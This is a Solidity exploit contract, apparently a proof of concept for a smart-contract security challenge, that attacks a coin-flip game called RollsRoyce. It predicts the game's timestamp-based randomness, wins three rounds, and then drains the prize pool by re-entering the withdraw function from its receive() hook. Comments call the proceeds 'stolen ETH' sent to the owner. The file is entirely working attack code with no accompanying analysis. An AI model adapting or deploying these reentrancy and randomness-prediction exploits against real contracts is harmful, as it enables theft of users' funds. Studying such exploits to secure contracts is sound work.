pragma solidity ^0.8.0;

interface IRollsRoyce {
    enum CoinFlipOption {
        HEAD,
        TAIL
    }

    function guess(CoinFlipOption _guess) external payable;

    function revealResults() external;

    function withdrawFirstWinPrizeMoneyBonus() external;
}

contract Attacker {
    IRollsRoyce rollsRoyceContract;
    address owner;

    constructor(address _contractAddress) {
        rollsRoyceContract = IRollsRoyce(_contractAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can execute this function");
        _;
    }

    function attack() external payable onlyOwner {
        // Exploit the randomness vulnerability by calculate the guess base on RollsRoyce contract logic
        IRollsRoyce.CoinFlipOption guess = IRollsRoyce.CoinFlipOption(
            uint(keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))) % 2
        );

        // Play 3 times
        rollsRoyceContract.guess{value: 1 ether}(guess);
        rollsRoyceContract.revealResults();

        rollsRoyceContract.guess{value: 1 ether}(guess);
        rollsRoyceContract.revealResults();

        rollsRoyceContract.guess{value: 1 ether}(guess);
        rollsRoyceContract.revealResults();

        // Call the withdraw prize function
        rollsRoyceContract.withdrawFirstWinPrizeMoneyBonus();

        // Send all the stolen ETH to the owner address
        (bool success, ) = owner.call{value: address(this).balance}("");
    }

    // Just an additional withdraw function allow owner to withdraw all ETH from attaker contract
    function withdraw() external onlyOwner {
        (bool success, ) = owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        // Exploit the Reentrancy vulnerability by recall the withdrawFirstWinPrizeMoneyBonus() function
        rollsRoyceContract.withdrawFirstWinPrizeMoneyBonus();
    }
}
